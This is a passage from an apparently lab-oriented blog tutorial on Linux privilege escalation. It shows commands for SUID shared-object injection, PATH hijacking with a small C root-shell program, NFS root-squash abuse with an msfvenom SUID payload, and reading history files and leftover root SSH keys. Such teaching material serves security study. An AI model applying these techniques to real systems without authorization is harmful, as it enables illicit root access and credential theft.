+</code></pre></td></tr></table>
+</div>
+</div><p>At first we have to identify the executables and vulnerable to <code>shared object injection</code>. For this we use the same technique with <code>find</code> and the strace the <code>so</code>
+file</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ strace /usr/local/bin/suid-so 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -iE <span class="s2">&#34;open|access|no such file&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Now, after running this we can see that shared object is loaded in our home directory but can&rsquo;t be found. So we can create that executables and the spawn a bash shell.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+</code></pre></td></tr></table>
+</div>
+</div><p>Finally running the executables again we spawn the root shell.</p>
+<h3 id="environment-variables">Environment Variables</h3>
+<p>Here we exploit the executables due to it inheriting the user&rsquo;s PATH environment variable and attempting to execute programs without specifying an absolute path.</p>
+<p>Lets take an example if <code>service</code> executable is being called to start the webserver, however full path isn&rsquo;t used then we can use the executable called service and spawn the Bash shell.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ gcc -o service /home/user/file/service.c
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="err">$</span> <span class="n">Service</span> <span class="n">code</span>
+<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/bash -p&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:</p>
+<p><code>PATH=.:$PATH /usr/local/bin/suid-env</code></p>
+<h2 id="6-nfs">6. NFS</h2>
+<p>Files created via NFS inherit the <strong>remote</strong> user&rsquo;s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the &ldquo;nobody&rdquo; user.</p>
+<p>Check the NFS share configuration on the Debian VM:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ cat /etc/exports
+</code></pre></td></tr></table>
+</div>
+</div><p>Note that the <strong>/tmp</strong> share has root squashing disabled.</p>
+<p>On your Kali box, switch to your root user if you are not already running as root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ sudo su
+</code></pre></td></tr></table>
+</div>
+</div><p>Using Kali&rsquo;s root user, create a mount point on your Kali box and mount the <strong>/tmp</strong> share (update the IP accordingly):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ mkdir /tmp/nfs  
+root@gr4n173:~$ mount -o rw,vers<span class="o">=</span><span class="m">2</span> 10.10.10.10:/tmp /tmp/nfs
+</code></pre></td></tr></table>
+</div>
+</div><p>Still using Kali&rsquo;s root user, generate a payload using <strong>msfvenom</strong> and save it to the mounted share (this payload simply calls /bin/bash):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ msfvenom -p linux/x86/exec <span class="nv">CMD</span><span class="o">=</span><span class="s2">&#34;/bin/bash -p&#34;</span> -f elf -o /tmp/nfs/shell.elf
+</code></pre></td></tr></table>
+</div>
+</div><p>Still using Kali&rsquo;s root user, make the file executable and set the SUID permission:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ chmod +xs /tmp/nfs/shell.elf
+</code></pre></td></tr></table>
+</div>
+</div><p>Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ /tmp/shell.elf
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="7-passwordkeys">7. Password&amp;Keys</h2>
+<h3 id="config-files">config Files</h3>
+<p>Sometimes the creator leave the credentials and keys inside the files so we have to check everypart of the directory.</p>
+<h3 id="history-files">History Files</h3>
+<p>Sometimes password may be typed in their command line by users.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ cat ~/.*history.txt <span class="p">|</span> less
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="ssh-keys">SSH Keys</h3>
+<p>Sometimes user makes the backups of important files but fail to secure them with correct permissions. So looking for hidden files &amp; directories in the system root.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ ls -al /
+</code></pre></td></tr></table>
+</div>
+</div><p>From there we found the <code>ssh_key</code> which can be used to ssh into root</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ chmod <span class="m">600</span> ssh_key_of_root
+</code></pre></td></tr></table>
+</div>
+</div><p>Ssh command to sshing into root.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ ssh -i ssh_key_of_root root@10.10.13.123
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-05-03</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/linuxprivsec/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.com/linuxprivsec/" data-title="Linux Privilege Escalation Guide" data-via="gr4n173" data-hashtags="linux"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.com/linuxprivsec/" data-hashtag="linux"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.com/linuxprivsec/" data-title="Linux Privilege Escalation Guide"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.com/linuxprivsec/" data-title="Linux Privilege Escalation Guide"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.com/linuxprivsec/" data-title="Linux Privilege Escalation Guide"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">linux</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/moee-1/" class="prev" rel="prev" title="Moee-1"><i class="fas fa-angle-left fa-fw"></i>Moee-1</a>
+            <a href="/windowsprivsec/" class="next" rel="next" title="Windows Privilege Escalation Guide">Windows Privilege Escalation Guide<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Lots of Love</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">gr4n173</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="https://dpak-creator.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"valine":{"appId":"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI","appKey":"WBmoGyJtbqUswvfLh6L8iEBr","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"serverURLs":"https://leancloud.hugoloveit.com","visitor":true}},"data":{"id-1":"gr4n173","id-2":"gr4n173"},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
